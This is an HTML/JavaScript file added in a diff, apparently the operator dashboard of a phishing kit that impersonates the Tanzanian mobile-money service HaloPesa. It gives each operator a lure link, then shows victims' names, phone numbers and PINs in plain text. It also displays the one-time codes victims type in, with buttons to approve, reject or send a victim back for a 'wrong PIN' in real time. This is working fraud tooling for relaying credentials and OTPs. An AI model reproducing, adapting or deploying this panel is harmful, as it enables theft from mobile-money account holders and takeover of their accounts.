@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HaloPesa Admin Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --brand-red:#cc3300;
+    --brand-orange:#ff6600;
+    --brand-amber:#ff9900;
+    --brand-yellow:#ffdd00;
+    --grad:linear-gradient(135deg,#ff6600,#ff9900);
+    --grad-deep:linear-gradient(135deg,#cc3300,#ff6600,#ff9900);
+    --page-bg:#EBEBEB;
+    --white:#FFFFFF;
+    --text-dark:#1C1C1C;
+    --text-mid:#444;
+    --text-light:#888;
+    --border:#ddd;
+    --radius:14px;
+    --radius-sm:9px;
+    --shadow-card:0 6px 28px rgba(0,0,0,0.08);
+    --shadow-pop:0 20px 60px rgba(0,0,0,0.22);
+    --green:#27AE60;
+    --green-bg:#f0fdf4;
+    --green-bd:#bbf7d0;
+    --red:#dc2626;
+    --red-bg:#fef2f2;
+    --red-bd:#fecaca;
+    --amber:#d97706;
+    --amber-bg:#fffbeb;
+    --amber-bd:#fde68a;
+    --blue:#2563eb;
+    --blue-bg:#eff6ff;
+    --blue-bd:#bfdbfe;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{font-family:'Inter',sans-serif;background:var(--page-bg);color:var(--text-dark);min-height:100vh;overflow-x:hidden}
+
+  /* ══════════ SCREENS ══════════ */
+  .screen{display:none;min-height:100vh;animation:fadeIn .35s ease}
+  .screen.active{display:flex;flex-direction:column}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+  /* ══════════ LOGIN SCREEN ══════════ */
+  #screen-login{background:var(--grad-deep);align-items:center;justify-content:center;padding:24px}
+  .login-wrap{width:100%;max-width:420px}
+  .login-card{background:#fff;border-radius:var(--radius);box-shadow:var(--shadow-pop);padding:38px 32px;animation:popIn .4s cubic-bezier(.34,1.56,.64,1)}
+  @keyframes popIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}
+  .login-logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:8px}
+  .login-logo svg{width:38px;height:38px;filter:drop-shadow(0 3px 6px rgba(255,102,0,.3))}
+  .login-logo .brand{font-size:1.6rem;font-weight:800;color:var(--text-dark);letter-spacing:-.03em}
+  .login-logo .brand span{color:var(--brand-orange)}
+  .login-title{text-align:center;font-size:.85rem;color:var(--text-light);margin-bottom:26px;font-weight:500;letter-spacing:.04em;text-transform:uppercase}
+  .login-badge{display:inline-block;background:var(--grad);color:#fff;font-size:.7rem;font-weight:700;padding:4px 12px;border-radius:20px;letter-spacing:.1em;margin-bottom:14px}
+
+  /* ══════════ NAVBAR ══════════ */
+  .navbar{background:var(--brand-red);display:flex;align-items:center;justify-content:space-between;padding:0 20px;height:60px;position:sticky;top:0;z-index:100;box-shadow:0 2px 12px rgba(204,51,0,0.25);flex-shrink:0}
+  .hp-logo-sm{display:flex;align-items:center;gap:8px}
+  .hp-logo-sm svg{width:26px;height:26px}
+  .hp-logo-sm .brand{font-size:1.1rem;font-weight:800;color:#fff;letter-spacing:-.02em}
+  .hp-logo-sm .brand span{color:var(--brand-yellow)}
+  .nav-right{display:flex;align-items:center;gap:12px}
+  .admin-chip{background:rgba(255,255,255,.18);color:#fff;font-size:.78rem;font-weight:700;padding:6px 14px;border-radius:20px;letter-spacing:.05em;border:1px solid rgba(255,255,255,.25)}
+  .logout-btn{background:rgba(255,255,255,.15);color:#fff;border:1px solid rgba(255,255,255,.25);border-radius:8px;padding:7px 14px;font-size:.78rem;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;transition:background .2s}
+  .logout-btn:hover{background:rgba(255,255,255,.28)}
+
+  /* ══════════ DASHBOARD ══════════ */
+  #screen-dashboard{background:var(--page-bg)}
+  .dash-body{flex:1;padding:24px 16px 40px;max-width:900px;width:100%;margin:0 auto}
+
+  /* ══════════ STATS ROW ══════════ */
+  .stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:24px}
+  .stat-card{background:#fff;border-radius:var(--radius-sm);padding:16px 14px;box-shadow:var(--shadow-card);text-align:center;border:1px solid rgba(0,0,0,.03);transition:transform .15s}
+  .stat-card:hover{transform:translateY(-2px)}
+  .stat-num{font-size:1.7rem;font-weight:800;color:var(--brand-orange);letter-spacing:-.03em;line-height:1}
+  .stat-num.green{color:var(--green)}
+  .stat-num.blue{color:var(--blue)}
+  .stat-lbl{font-size:.7rem;color:var(--text-light);text-transform:uppercase;letter-spacing:.06em;font-weight:700;margin-top:8px}
+
+  /* ══════════ LINK CARD ══════════ */
+  .link-card{background:#fff;border-radius:var(--radius);padding:22px;box-shadow:var(--shadow-card);margin-bottom:24px;border-left:4px solid var(--brand-orange)}
+  .link-card h3{font-size:.95rem;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:8px}
+  .link-card p{font-size:.82rem;color:var(--text-light);margin-bottom:14px}
+  .link-row{display:flex;gap:8px;align-items:stretch}
+  .link-input{flex:1;background:#f7f7f7;border:1.5px solid var(--border);border-radius:var(--radius-sm);padding:12px 14px;font-size:.85rem;font-family:'Inter',sans-serif;color:var(--text-dark);outline:none;font-weight:600}
+  .link-input:focus{border-color:var(--brand-orange)}
+  .copy-btn{background:var(--grad);color:#fff;border:none;border-radius:var(--radius-sm);padding:0 20px;font-size:.82rem;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;letter-spacing:.04em;transition:opacity .2s;white-space:nowrap;box-shadow:0 4px 12px rgba(255,102,0,.3)}
+  .copy-btn:hover{opacity:.92}
+
+  /* ══════════ SECTION HEADERS ══════════ */
+  .section-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+  .section-head h2{font-size:1.05rem;font-weight:800;letter-spacing:-.01em;display:flex;align-items:center;gap:8px}
+  .badge{background:var(--brand-orange);color:#fff;font-size:.7rem;font-weight:800;padding:3px 10px;border-radius:20px;letter-spacing:.04em;min-width:24px;text-align:center}
+  .badge.empty{background:#ccc}
+
+  /* ══════════ FEED / CARDS ══════════ */
+  .feed{display:flex;flex-direction:column;gap:12px;margin-bottom:28px}
+  .card{background:#fff;border-radius:var(--radius);box-shadow:var(--shadow-card);padding:18px;border:1px solid rgba(0,0,0,.03);animation:fadeIn .3s ease}
+  .card-top{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:12px}
+  .card-info{flex:1;min-width:0}
+  .card-name{font-size:1rem;font-weight:700;letter-spacing:-.01em;margin-bottom:3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .card-meta{font-size:.8rem;color:var(--text-light);font-weight:500}
+  .card-meta strong{color:var(--text-mid);font-weight:700}
+  .card-time{font-size:.72rem;color:var(--text-light);font-weight:600;white-space:nowrap;background:#f5f5f5;padding:4px 10px;border-radius:20px}
+  .card-actions{display:flex;gap:8px;flex-wrap:wrap}
+  .card-actions button{flex:1;min-width:100px;border:none;border-radius:var(--radius-sm);padding:11px 14px;font-size:.82rem;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;letter-spacing:.04em;transition:transform .12s,opacity .2s}
+  .card-actions button:hover{transform:translateY(-1px)}
+  .card-actions button:active{transform:translateY(0)}
+  .btn-approve{background:linear-gradient(135deg,#2ECC71,#27AE60);color:#fff;box-shadow:0 4px 12px rgba(46,204,113,.3)}
+  .btn-reject{background:#fff;color:var(--red);border:1.5px solid var(--red-bd) !important;box-shadow:none}
+  .btn-reject:hover{background:var(--red-bg)}
+  .btn-wrongpin{background:#fff;color:var(--amber);border:1.5px solid var(--amber-bd) !important;box-shadow:none}
+  .btn-wrongpin:hover{background:var(--amber-bg)}
+
+  /* ══════════ OTP DISPLAY ══════════ */
+  .otp-show{display:flex;gap:6px;margin-top:10px}
+  .otp-digit{width:38px;height:44px;background:#f7f7f7;border:1.5px solid var(--border);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.15rem;font-weight:800;color:var(--brand-red);letter-spacing:-.02em}
+
+  /* ══════════ FEED (NOTIFICATIONS) ══════════ */
+  .notif{background:#fff;border-radius:var(--radius-sm);padding:13px 16px;box-shadow:var(--shadow-card);display:flex;align-items:center;gap:12px;border-left:3px solid var(--brand-orange);animation:slideIn .3s ease}
+  @keyframes slideIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
+  .notif-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:.95rem;flex-shrink:0;background:var(--amber-bg);border:1px solid var(--amber-bd)}
+  .notif-icon.blue{background:var(--blue-bg);border-color:var(--blue-bd)}
+  .notif-body{flex:1;min-width:0}
+  .notif-title{font-size:.85rem;font-weight:700;margin-bottom:2px}
+  .notif-sub{font-size:.75rem;color:var(--text-light);font-weight:500}
+  .notif-time{font-size:.7rem;color:var(--text-light);font-weight:600;white-space:nowrap}
+
+  /* ══════════ EMPTY STATE ══════════ */
+  .empty-state{background:#fff;border-radius:var(--radius);padding:40px 24px;text-align:center;box-shadow:var(--shadow-card);border:1px dashed var(--border)}
+  .empty-state .es-icon{font-size:2.2rem;margin-bottom:12px;opacity:.5}
+  .empty-state h4{font-size:.95rem;font-weight:700;color:var(--text-mid);margin-bottom:6px}
+  .empty-state p{font-size:.82rem;color:var(--text-light)}
+
+  /* ══════════ ERROR MESSAGE ══════════ */
+  .msg-box{border-radius:var(--radius-sm);padding:12px 16px;font-size:.85rem;margin-bottom:16px;display:none;align-items:center;gap:10px;font-weight:500}
+  .msg-box.show{display:flex}
+  .msg-box.error{background:var(--red-bg);border:1.5px solid var(--red-bd);color:#991b1b}
+  .msg-icon{font-size:1.05rem;flex-shrink:0;font-weight:700}
+
+  /* ══════════ TOAST ══════════ */
+  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:var(--text-dark);color:#fff;padding:13px 22px;border-radius:30px;font-size:.85rem;font-weight:600;box-shadow:0 12px 36px rgba(0,0,0,.3);z-index:9999;opacity:0;transition:transform .35s cubic-bezier(.34,1.56,.64,1),opacity .35s;pointer-events:none;max-width:90vw;text-align:center}
+  .toast.show{transform:translateX(-50%) translateY(0);opacity:1}
+  .toast.success{background:var(--green)}
+  .toast.error{background:var(--red)}
+  .toast.info{background:var(--blue)}
+
+  /* ══════════ SPINNER ══════════ */
+  .spinner{width:44px;height:44px;border:4px solid #f0f0f0;border-top-color:var(--brand-orange);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 18px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* ══════════ PULL REFRESH HINT ══════════ */
+  .live-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--green);margin-right:6px;animation:blink 1.5s infinite}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+  /* ══════════ RESPONSIVE ══════════ */
+  @media(max-width:600px){
+    .stats-row{grid-template-columns:repeat(3,1fr);gap:8px}
+    .stat-card{padding:14px 8px}
+    .stat-num{font-size:1.4rem}
+    .stat-lbl{font-size:.62rem}
+    .dash-body{padding:18px 12px 32px}
+    .login-card{padding:30px 22px}
+    .card-actions button{min-width:0;font-size:.78rem;padding:10px 8px}
+    .otp-digit{width:34px;height:40px;font-size:1rem}
+  }
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- SCREEN 1: LOGIN                                            -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div id="screen-login" class="screen active">
+  <div class="login-wrap">
+    <div class="login-card">
+      <div class="login-logo">
+        <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+          <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+          <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+        </svg>
+        <div class="brand">Halo<span>Pesa</span></div>
+      </div>
+      <p class="login-title">Admin Panel</p>
+
+      <div style="text-align:center"><span class="login-badge">🔐 SECURE LOGIN</span></div>
+
+      <div class="msg-box error" id="loginErr" style="margin-top:18px"><span class="msg-icon">✕</span><span id="loginErrTxt"></span></div>
+
+      <div class="field" style="margin-bottom:18px">
+        <label style="display:block;font-size:.83rem;font-weight:600;color:#444;margin-bottom:7px">Admin ID</label>
+        <input type="text" id="loginAdminId" placeholder="SaScO" style="width:100%;padding:13px 15px;border:1.5px solid #ddd;border-radius:9px;font-family:'Inter',sans-serif;font-size:.92rem;color:#1C1C1C;background:#fff;outline:none;transition:border-color .2s;text-transform:uppercase;letter-spacing:.05em;font-weight:600" oninput="clearLoginErr()" onfocus="this.style.borderColor='#ff6600'" onblur="this.style.borderColor='#ddd'">
+      </div>
+
+      <div class="field" style="margin-bottom:22px">
+        <label style="display:block;font-size:.83rem;font-weight:600;color:#444;margin-bottom:7px">PIN / Password</label>
+        <input type="password" id="loginPassword" placeholder="••••••" style="width:100%;padding:13px 15px;border:1.5px solid #ddd;border-radius:9px;font-family:'Inter',sans-serif;font-size:.92rem;color:#1C1C1C;background:#fff;outline:none;transition:border-color .2s;letter-spacing:.15em" oninput="clearLoginErr()" onfocus="this.style.borderColor='#ff6600'" onblur="this.style.borderColor='#ddd'">
+      </div>
+
+      <button class="btn-grad" id="loginBtn" onclick="adminLogin()" style="background:linear-gradient(135deg,#ff6600,#ff9900);color:#fff;border:none;border-radius:9px;padding:15px 20px;font-size:.9rem;font-weight:700;letter-spacing:.06em;cursor:pointer;width:100%;font-family:'Inter',sans-serif;transition:opacity .2s;box-shadow:0 6px 18px rgba(255,102,0,.3)">INGIA</button>
+
+      <p style="text-align:center;font-size:.72rem;color:#888;margin-top:18px;line-height:1.6">© 2026 HaloPesa Tanzania<br>Admin access only</p>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- SCREEN 2: DASHBOARD                                        -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div id="screen-dashboard" class="screen">
+  <nav class="navbar">
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+      </svg>
+      <div class="brand">Halo<span>Pesa</span></div>
+    </div>
+    <div class="nav-right">
+      <span class="admin-chip" id="navAdminId">—</span>
+      <button class="logout-btn" onclick="adminLogout()">Toka</button>
+    </div>
+  </nav>
+
+  <div class="dash-body">
+
+    <!-- STATS -->
+    <div class="stats-row">
+      <div class="stat-card">
+        <div class="stat-num" id="statRegs">0</div>
+        <div class="stat-lbl">Registrations</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num blue" id="statOtps">0</div>
+        <div class="stat-lbl">OTPs</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num green" id="statNotifs">0</div>
+        <div class="stat-lbl">Notifications</div>
+      </div>
+    </div>
+
+    <!-- ADMIN LINK -->
+    <div class="link-card">
+      <h3>🔗 Kiungo Chako cha Admin</h3>
+      <p>Tumia kiungo hiki kuwakaribisha watumiaji. Kila mtu anayefungua kiungo hiki ataonekana hapa chini.</p>
+      <div class="link-row">
+        <input type="text" class="link-input" id="adminLink" readonly>
+        <button class="copy-btn" onclick="copyAdminLink()">NAKILI</button>
+      </div>
+    </div>
+
+    <!-- NOTIFICATIONS FEED -->
+    <div class="section-head">
+      <h2><span class="live-dot"></span>Taarifa za Hivi Karibuni</h2>
+      <span class="badge" id="notifBadge">0</span>
+    </div>
+    <div class="feed" id="notifFeed"></div>
+
+    <!-- PENDING REGISTRATIONS -->
+    <div class="section-head">
+      <h2>📝 Usajili Unasubiri</h2>
+      <span class="badge" id="regBadge">0</span>
+    </div>
+    <div class="feed" id="regFeed"></div>
+
+    <!-- PENDING OTPs -->
+    <div class="section-head">
+      <h2>🔢 OTP Zinasubiri</h2>
+      <span class="badge" id="otpBadge">0</span>
+    </div>
+    <div class="feed" id="otpFeed"></div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!-- TOAST                                                       -->
+<!-- ══════════════════════════════════════════════════════════ -->
+<div class="toast" id="toast"></div>
+
+<script>
+/* ══════════════════════════════════════════════════════════
+   STATE
+   ══════════════════════════════════════════════════════════ */
+const A = {
+  adminId: null,
+  password: null,
+  pollInterval: null,
+  notifSeen: new Set(),
+  regSeen: new Set(),
+  otpSeen: new Set()
+};
+
+/* ══════════════════════════════════════════════════════════
+   HELPERS
+   ══════════════════════════════════════════════════════════ */
+function showScreen(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+function clearLoginErr() {
+  document.getElementById('loginErr').classList.remove('show');
+}
+
+function showLoginErr(msg) {
+  document.getElementById('loginErrTxt').textContent = msg;
+  document.getElementById('loginErr').classList.add('show');
+}
+
+function toast(msg, type = 'info', duration = 2600) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + type;
+  clearTimeout(t._timer);
+  t._timer = setTimeout(() => { t.className = 'toast ' + type; }, duration);
+}
+
+function timeAgo(iso) {
+  if (!iso) return '—';
+  const diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
+  if (diff < 5) return 'sasa hivi';
+  if (diff < 60) return diff + 's zilizopita';
+  if (diff < 3600) return Math.floor(diff / 60) + 'm zilizopita';
+  if (diff < 86400) return Math.floor(diff / 3600) + 'h zilizopita';
+  return Math.floor(diff / 86400) + 'd zilizopita';
+}
+
+function esc(str) {
+  const d = document.createElement('div');
+  d.textContent = str == null ? '' : String(str);
+  return d.innerHTML;
+}
+
+/* ══════════════════════════════════════════════════════════
+   LOGIN
+   ══════════════════════════════════════════════════════════ */
+async function adminLogin() {
+  const adminId = document.getElementById('loginAdminId').value.trim().toUpperCase();
+  const password = document.getElementById('loginPassword').value.trim();
+
+  if (!adminId) { showLoginErr('Tafadhali weka Admin ID'); return; }
+  if (!password) { showLoginErr('Tafadhali weka PIN/Password'); return; }
+
+  const btn = document.getElementById('loginBtn');
+  btn.disabled = true;
+  btn.textContent = 'INATHIBITISHA...';
+
+  try {
+    const res = await fetch('/api/admin-login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ adminId, password })
+    });
+
+    const data = await res.json();
+
+    if (data.success) {
+      A.adminId = adminId;
+      A.password = password;
+      sessionStorage.setItem('hp_admin_id', adminId);
+      sessionStorage.setItem('hp_admin_pwd', password);
+      enterDashboard();
+    } else {
+      showLoginErr(data.message || 'Admin ID au PIN si sahihi');
+      btn.disabled = false;
+      btn.textContent = 'INGIA';
+    }
+  } catch (e) {
+    showLoginErr('Hitilafu ya mtandao. Tafadhali jaribu tena.');
+    btn.disabled = false;
+    btn.textContent = 'INGIA';
+  }
+}
+
+function enterDashboard() {
+  document.getElementById('navAdminId').textContent = A.adminId;
+
+  const link = window.location.origin + window.location.pathname.replace('admin.html', '') + '?admin=' + A.adminId;
+  document.getElementById('adminLink').value = link;
+
+  showScreen('screen-dashboard');
+  startPolling();
+}
+
+function adminLogout() {
+  if (A.pollInterval) { clearInterval(A.pollInterval); A.pollInterval = null; }
+  A.adminId = null;
+  A.password = null;
+  A.notifSeen = new Set();
+  A.regSeen = new Set();
+  A.otpSeen = new Set();
+  sessionStorage.removeItem('hp_admin_id');
+  sessionStorage.removeItem('hp_admin_pwd');
+  document.getElementById('loginAdminId').value = '';
+  document.getElementById('loginPassword').value = '';
+  document.getElementById('loginBtn').disabled = false;
+  document.getElementById('loginBtn').textContent = 'INGIA';
+  clearLoginErr();
+  showScreen('screen-login');
+}
+
+/* ══════════════════════════════════════════════════════════
+   COPY ADMIN LINK
+   ══════════════════════════════════════════════════════════ */
+function copyAdminLink() {
+  const input = document.getElementById('adminLink');
+  input.select();
+  input.setSelectionRange(0, 99999);
+  try {
+    navigator.clipboard.writeText(input.value);
+    toast('✅ Kiungo kimenakiliwa!', 'success');
+  } catch (e) {
+    document.execCommand('copy');
+    toast('✅ Kiungo kimenakiliwa!', 'success');
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   POLLING
+   ══════════════════════════════════════════════════════════ */
+function startPolling() {
+  if (A.pollInterval) clearInterval(A.pollInterval);
+  refreshAll();
+  A.pollInterval = setInterval(refreshAll, 4000);
+}
+
+async function refreshAll() {
+  await Promise.all([
+    loadNotifications(),
+    loadPendingRegistrations(),
+    loadPendingOtps()
+  ]);
+}
+
+/* ══════════════════════════════════════════════════════════
+   NOTIFICATIONS FEED
+   ══════════════════════════════════════════════════════════ */
+async function loadNotifications() {
+  try {
+    const res = await fetch(`/api/admin/notifications?adminId=${A.adminId}`);
+    if (!res.ok) return;
+    const data = await res.json();
+    const list = data.notifications || [];
+
+    document.getElementById('statNotifs').textContent = list.length;
+    document.getElementById('notifBadge').textContent = list.length;
+    document.getElementById('notifBadge').className = 'badge' + (list.length === 0 ? ' empty' : '');
+
+    const feed = document.getElementById('notifFeed');
+    if (list.length === 0) {
+      feed.innerHTML = '<div class="empty-state"><div class="es-icon">🔔</div><h4>Hakuna taarifa bado</h4><p>Taarifa mpya zitaonekana hapa</p></div>';
+      return;
+    }
+
+    // New-notification toast
+    list.forEach(n => {
+      const key = n.id || (n.type + '_' + n.timestamp);
+      if (!A.notifSeen.has(key)) {
+        if (A.notifSeen.size > 0 || n.isNew) {
+          const msg = n.type === 'link_opened' ? '🔗 Mtu amefungua kiungo chako' :
+                      n.type === 'otp_resent' ? '🔄 Mtu ametuma OTP tena' :
+                      '🔔 Taarifa mpya';
+          toast(msg, 'info', 3000);
+        }
+        A.notifSeen.add(key);
+      }
+    });
+
+    feed.innerHTML = list.slice(0, 15).map(n => {
+      const isLink = n.type === 'link_opened';
+      return `
+        <div class="notif">
+          <div class="notif-icon ${isLink ? 'blue' : ''}">${isLink ? '🔗' : '🔄'}</div>
+          <div class="notif-body">
+            <div class="notif-title">${isLink ? 'Kiungo kimefunguliwa' : 'OTP imetumwa tena'}</div>
+            <div class="notif-sub">${esc(n.userAgent || n.message || 'Mtu ameingia')}</div>
+          </div>
+          <div class="notif-time">${timeAgo(n.timestamp)}</div>
+        </div>
+      `;
+    }).join('');
+  } catch (e) {
+    console.error('loadNotifications error:', e);
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   PENDING REGISTRATIONS
+   ══════════════════════════════════════════════════════════ */
+async function loadPendingRegistrations() {
+  try {
+    const res = await fetch(`/api/admin/pending-registrations?adminId=${A.adminId}`);
+    if (!res.ok) return;
+    const data = await res.json();
+    const list = data.registrations || [];
+
+    document.getElementById('statRegs').textContent = list.length;
+    document.getElementById('regBadge').textContent = list.length;
+    document.getElementById('regBadge').className = 'badge' + (list.length === 0 ? ' empty' : '');
+
+    const feed = document.getElementById('regFeed');
+    if (list.length === 0) {
+      feed.innerHTML = '<div class="empty-state"><div class="es-icon">📝</div><h4>Hakuna usajili mpya</h4><p>Usajili mpya utaonekana hapa</p></div>';
+      return;
+    }
+
+    list.forEach(r => {
+      const key = r.registrationId;
+      if (!A.regSeen.has(key)) {
+        A.regSeen.add(key);
+      }
+    });
+
+    feed.innerHTML = list.map(r => `
+      <div class="card">
+        <div class="card-top">
+          <div class="card-info">
+            <div class="card-name">${esc(r.firstName)} ${esc(r.lastName)}</div>
+            <div class="card-meta">HaloPesa: <strong>${esc(r.haloNumber)}</strong></div>
+            <div class="card-meta" style="margin-top:2px">PIN: <strong>${esc(r.password || '••••')}</strong></div>
+          </div>
+          <div class="card-time">${timeAgo(r.timestamp)}</div>
+        </div>
+        <div class="card-actions">
+          <button class="btn-approve" onclick="approveReg('${r.registrationId}')">✓ IDHINISHA</button>
+          <button class="btn-reject" onclick="rejectReg('${r.registrationId}')">✕ KATAA</button>
+        </div>
+      </div>
+    `).join('');
+  } catch (e) {
+    console.error('loadPendingRegistrations error:', e);
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   PENDING OTPs
+   ══════════════════════════════════════════════════════════ */
+async function loadPendingOtps() {
+  try {
+    const res = await fetch(`/api/admin/pending-otps?adminId=${A.adminId}`);
+    if (!res.ok) return;
+    const data = await res.json();
+    const list = data.otps || [];
+
+    document.getElementById('statOtps').textContent = list.length;
+    document.getElementById('otpBadge').textContent = list.length;
+    document.getElementById('otpBadge').className = 'badge' + (list.length === 0 ? ' empty' : '');
+
+    const feed = document.getElementById('otpFeed');
+    if (list.length === 0) {
+      feed.innerHTML = '<div class="empty-state"><div class="es-icon">🔢</div><h4>Hakuna OTP mpya</h4><p>OTP mpya zitaonekana hapa</p></div>';
+      return;
+    }
+
+    list.forEach(r => {
+      if (!A.otpSeen.has(r.registrationId)) A.otpSeen.add(r.registrationId);
+    });
+
+    feed.innerHTML = list.map(r => {
+      const otp = String(r.otp || '0000');
+      const digits = otp.split('').map(d => `<div class="otp-digit">${esc(d)}</div>`).join('');
+      const isResend = r.isResend;
+      return `
+        <div class="card" style="border-left:4px solid ${isResend ? '#d97706' : '#2563eb'}">
+          <div class="card-top">
+            <div class="card-info">
+              <div class="card-name">${esc(r.firstName)} ${esc(r.lastName)}</div>
+              <div class="card-meta">HaloPesa: <strong>${esc(r.haloNumber)}</strong>${isResend ? ' • <span style="color:#d97706;font-weight:700">RESEND</span>' : ''}</div>
+              <div class="otp-show">${digits}</div>
+            </div>
+            <div class="card-time">${timeAgo(r.timestamp)}</div>
+          </div>
+          <div class="card-actions" style="margin-top:14px">
+            <button class="btn-approve" onclick="approveOtp('${r.registrationId}')">✓ SAHIHI</button>
+            <button class="btn-reject" onclick="rejectOtp('${r.registrationId}')">✕ KATAA</button>
+            <button class="btn-wrongpin" onclick="wrongPinOtp('${r.registrationId}')">⚠ PIN MBAYA</button>
+          </div>
+        </div>
+      `;
+    }).join('');
+  } catch (e) {
+    console.error('loadPendingOtps error:', e);
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   ACTIONS: REGISTRATIONS
+   ══════════════════════════════════════════════════════════ */
+async function approveReg(registrationId) {
+  await act(`/api/admin/approve-registration`, registrationId, '✅ Usajili umeidhinishwa');
+}
+async function rejectReg(registrationId) {
+  await act(`/api/admin/reject-registration`, registrationId, '❌ Usajili umekataliwa');
+}
+
+/* ══════════════════════════════════════════════════════════
+   ACTIONS: OTPs
+   ══════════════════════════════════════════════════════════ */
+async function approveOtp(registrationId) {
+  await act(`/api/admin/approve-otp`, registrationId, '✅ OTP imethibitishwa');
+}
+async function rejectOtp(registrationId) {
+  await act(`/api/admin/reject-otp`, registrationId, '❌ OTP imekataliwa');
+}
+async function wrongPinOtp(registrationId) {
+  await act(`/api/admin/wrongpin-otp`, registrationId, '⚠️ PIN mbaya - mtumiaji amerudishwa');
+}
+
+/* ══════════════════════════════════════════════════════════
+   GENERIC ACTION
+   ══════════════════════════════════════════════════════════ */
+async function act(url, registrationId, successMsg) {
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ registrationId, adminId: A.adminId })
+    });
+    const data = await res.json();
+    if (data.success || res.ok) {
+      toast(successMsg, 'success');
+      refreshAll();
+    } else {
+      toast(data.message || 'Hitilafu', 'error');
+    }
+  } catch (e) {
+    toast('Hitilafu ya mtandao', 'error');
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   AUTO-LOGIN (sessionStorage)
+   ══════════════════════════════════════════════════════════ */
+window.addEventListener('DOMContentLoaded', async () => {
+  const savedId = sessionStorage.getItem('hp_admin_id');
+  const savedPwd = sessionStorage.getItem('hp_admin_pwd');
+
+  if (savedId && savedPwd) {
+    try {
+      const res = await fetch('/api/admin-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ adminId: savedId, password: savedPwd })
+      });
+      const data = await res.json();
+      if (data.success) {
+        A.adminId = savedId;
+        A.password = savedPwd;
+        enterDashboard();
+        return;
+      }
+    } catch (e) { /* fall through to login screen */ }
+  }
+
+  console.log('✅ HaloPesa Admin initialized');
+});
+</script>
+
+</body>
+</html>
